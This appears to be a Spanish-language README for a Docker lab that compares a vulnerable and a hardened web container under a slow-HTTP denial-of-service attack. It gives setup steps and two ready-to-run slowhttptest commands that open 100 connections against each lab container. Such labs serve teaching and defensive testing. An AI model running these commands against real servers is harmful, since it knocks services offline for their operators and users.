# Laboratorio de ataque DOS

Este laboratorio proporciona un entorno configurado para llevar a cabo pruebas de ataques de Denegación de Servicio (DOS) o Distributed Denial of Service (DDOS) utilizando Docker.

## Instrucciones

### Preparación del entorno

1. clonar el repositorio.

   ```bash
   git clone git@github.com:Branyoe/DOS-attack-lab.git
   ```
2. Crea una copia del archivo *".example.env.prod"* llamada *".env.prod"* y completalo con datos validos.
3. Levantar la aplicación.

   ```bash
   docker compose --env-file .env.prod up
   ```

### Preparación de host para atacar.

1. Accede a la consola del contendor vulnerable a atacar.

   ```bash
   docker exec -it attacked-vuln sh
   ```
2. Ejecuta el monitor de pm2.

   ```bash
   pm2 monit
   ```
3. Accede a la consola del contendor seguro.

   ```bash
   docker exec -it attacked-secure sh
   ```
4. Ejecuta el monitor de pm2.

   ```bash
   pm2 monit
   ```
5. Accede a la consola de contenedor atacante.

   ```bash
   docker exec -it attacker-1 /bin/bash
   ```
6. Ejecuta el ataque al contenedor vulnerable.

   ```bash
   slowhttptest -c 100 -H -g -o slowhttp -i 3 -r 100 -t GET -u http://attacked-vuln:3000 -x 50 -p 3
   ```
7. Ejecuta el ataque al contendor seguro.

   ```bash
   slowhttptest -c 100 -H -g -o slowhttp -i 3 -r 100 -t GET -u http://attacked-secure:3001 -x 50 -p 3
   ```
8. Mira ambos monitores y compara el resultado.
